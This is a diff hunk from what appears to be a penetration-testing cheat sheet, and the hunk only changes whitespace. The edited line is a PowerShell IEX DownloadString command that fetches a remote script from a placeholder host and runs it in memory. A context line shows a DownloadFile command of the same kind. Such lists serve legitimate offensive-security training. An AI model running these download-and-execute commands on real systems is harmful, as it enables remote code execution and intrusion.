@@ -31,7 +31,7 @@ powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<ip>/<file
 
 ```powershell
 # Run powershell script on attack systemwithout saving to disk
-powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://<ip>/<file.ps1>')
+powershell.exe IEX(New-Object System.Net.WebClient).DownloadString('http://<ip>/<file.ps1>')
 ```
 
 ```bash
